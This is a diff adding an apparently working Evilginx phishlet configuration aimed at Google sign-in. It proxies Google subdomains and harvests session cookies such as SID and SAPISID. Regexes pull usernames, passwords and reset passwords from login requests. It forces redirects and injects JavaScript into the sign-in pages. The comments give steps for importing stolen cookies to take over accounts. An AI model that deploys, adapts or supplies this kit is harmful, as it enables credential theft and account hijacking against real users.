@@ -1,0 +1,137 @@
+name: 'Google'
+author: '@an0nud4y'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+
+
+sub_filters:
+# (In case js_inject don't works) Redirect on desired url (replace targetDomain) if successful login occurs by detecting valid session cookies
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>var redirectCount=0,maxRedirects=3,targetDomain="https://google.com";function checkCookies(){document.cookie.includes("SID")&&document.cookie.includes("APISID")&&document.cookie.includes("SAPISID")?window.location.hostname!==targetDomain?window.location.href=targetDomain:cancelAnimationFrame(animationId):++redirectCount>=maxRedirects&&cancelAnimationFrame(animationId)}document.addEventListener("DOMContentLoaded",(function(){checkCookies(),animationId=requestAnimationFrame((function e(){checkCookies(),animationId=requestAnimationFrame(e)}))}));</script></body>', mimes: ['text/html', 'application/json']}
+
+
+# Goback if browser not support issues occurs for some reason
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>!function(){function e(){var e=document.body.textContent||document.body.innerText,n=window.location.href.includes("v3/signin/rejected");e.includes("This browser or app may not be secure.")&&n&&(window.location.href="/")}document.addEventListener("DOMContentLoaded",e),window.addEventListener("load",e),setTimeout(e,2e3)}();</script></body>', mimes: ['text/html', 'application/json']}
+
+# Fixing Forget Password Actions
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</body>', replace: '<script>var isListenerAdded = false, intervalID = setInterval(() => (!document.body.innerText.includes("You can update your password now if you forgot it.") ? (console.warn("Required text not found. Operations aborted."), isListenerAdded = true) : window.location.href.includes("/changepassword") ? ((button = document.querySelectorAll("button[type=\"button\"]")[1]) && button.innerText === "Update password" ? (console.log("On the way to add Listener ..."), button.addEventListener("click", () => window.location.href.includes("/changepassword") && setTimeout(() => location.reload(), 2000)), console.log("Event listener added to the button."), isListenerAdded = true) : !isListenerAdded ? (console.warn("Button not found. Retrying in 500ms."), setTimeout(() => addButtonEventListener(), 500)) : null) : console.warn("URL does not match. Operations aborted."), isListenerAdded && clearInterval(intervalID)), 500);</script></body>', mimes: ['text/html', 'application/json']}
+  
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html']}
+
+  
+auth_tokens:
+  - domain: '.google.com'
+    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", "OGPC", "OGP", "1P_JAR", "CONSENT", "SMSV", "user_id", ".*,regexp"]
+  - domain: 'accounts.google.com'
+    keys: ["GAPS", "LSID", "_utmt", "utmz", "_utmb", "ACCOUNT_CHOOSER", ".*,regexp"]
+
+# Injecting Google Session cookies
+# - Go to google.com
+# - Delete cookies
+# - then import cookies
+# - then refresh and go to account.google.com or mail.google.com
+# - then click on sign in
+# - then insert cookies
+# - and then refresh page and if not logged in insert cookies again and wait for it to automatically detect or refresh.
+
+auth_urls:
+  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
+  - '/CheckCookie'
+  - '/ManageAccount'
+  - '/'
+
+credentials:
+  username:
+    key: ''
+    search: '\[\[\["V1UmUe","\[null,\\"(.*?)\\"'
+    type: 'post'
+  password:
+    key: ''
+    search: '\[1,1,null,\[1,null,null,null,\[\\"(.*?)\\",null,1\]\]'
+    type: 'post'
+  custom:
+    # Updated_Password after password reset
+    - key: 'f.req'
+      search: '\["gf.siecp","([^"]*)"\]' 
+      type: 'post'
+
+force_post:
+  - path: '/selectchallenge'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+      #- {key: 'bghash', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/signin'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+      - {key: 'bghash', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/speedbump'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+  - path: '/'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
+    type: 'post'
+
+
+
+login:
+  domain: 'accounts.google.com'
+  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+
+js_inject:
+  - trigger_domains: ['accounts.google.com']
+    trigger_paths: ['/' , '/changepassword', '/signin']
+    script: |
+        //----------------Redirection on success login--------------------
+        var redirectCount = 0;
+        var maxRedirects = 3;
+        //var targetDomain = '{redirect-url}';
+        var targetDomain = 'https://google.com'; // Update with the target domain
+        function checkCookies() {
+            if (document.cookie.includes('SID') && document.cookie.includes('APISID') && document.cookie.includes('SAPISID')) {
+                if (window.location.hostname !== targetDomain) {
+                    window.location.href = targetDomain;
+                } else {
+                    cancelAnimationFrame(animationId);
+                }
+            } else {
+                redirectCount++;
+                if (redirectCount >= maxRedirects) {
+                    cancelAnimationFrame(animationId);
+                }
+            }
+        }
+        document.addEventListener('DOMContentLoaded', function() {
+            // Call the checkCookies function at the start
+            checkCookies();
+            // Continue to call checkCookies before each repaint
+            animationId = requestAnimationFrame(function repeat() {
+                checkCookies();
+                animationId = requestAnimationFrame(repeat);
+            });
+        });
